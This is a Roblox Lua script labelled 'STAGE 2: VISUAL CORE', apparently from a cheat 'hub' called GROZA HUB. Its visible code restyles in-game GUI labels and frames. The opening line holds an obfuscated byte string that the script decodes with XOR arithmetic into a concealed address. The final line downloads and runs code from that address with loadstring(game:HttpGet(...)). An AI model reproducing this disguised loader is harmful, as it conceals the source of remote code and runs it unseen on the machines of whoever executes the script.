
--[[ STAGE 2: VISUAL CORE ]]
local qj5UuXy1qjkQ="\132\111\118\129\139\217\237\244\166\188\177\015\207\224\202\237\217\245\231\244\005\001\025\036\042\023\047\063\044\141\081\092\097\170\086\096\123\113\121\128\219\190\195\206\245\199\208\236\019\197\215\223\219\054\254\250\005\007\005\096\037\040\055\059\131\078\055\067\090\088\171\095\125\105\131\141\131\220\156\151\169\176\000\197\181\208"local pdVhAj1ROOGmmjbgHYfBOW=116 local mmmPNlBBYwhYL=92 local TYeNkpSYWyPaLB=0 local SMvJfY0wl_bFk1MQx=7 local t_if2NTgZuiwaX=5 local NLQoTjGgiwpOyukzE=false local K1E5DpjW72EN=bit32 and bit32.bxor if not K1E5DpjW72EN then K1E5DpjW72EN=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local F9NrAhDDOI9J={}for qo8Qi3sH5h7Vpxr4=1,#qj5UuXy1qjkQ do local xosi3H2laeTTo4KSoYLztB=string.byte(qj5UuXy1qjkQ,qo8Qi3sH5h7Vpxr4)local K5u0hYlcShpaAm047KQD=(mmmPNlBBYwhYL+(qo8Qi3sH5h7Vpxr4*SMvJfY0wl_bFk1MQx)+t_if2NTgZuiwaX)%256 if TYeNkpSYWyPaLB==0 then xosi3H2laeTTo4KSoYLztB=(xosi3H2laeTTo4KSoYLztB-K5u0hYlcShpaAm047KQD)%256 F9NrAhDDOI9J[qo8Qi3sH5h7Vpxr4]=string.char(K1E5DpjW72EN(xosi3H2laeTTo4KSoYLztB,pdVhAj1ROOGmmjbgHYfBOW))else xosi3H2laeTTo4KSoYLztB=K1E5DpjW72EN(xosi3H2laeTTo4KSoYLztB,pdVhAj1ROOGmmjbgHYfBOW)F9NrAhDDOI9J[qo8Qi3sH5h7Vpxr4]=string.char((xosi3H2laeTTo4KSoYLztB-K5u0hYlcShpaAm047KQD)%256)end end local eOSiDLuTGFoCYqT=table.concat(F9NrAhDDOI9J)if NLQoTjGgiwpOyukzE then eOSiDLuTGFoCYqT=string.reverse(eOSiDLuTGFoCYqT)end local v8B3BHirZ1ffr=eOSiDLuTGFoCYqT
local HubName = "GROZA HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(v8B3BHirZ1ffr))()
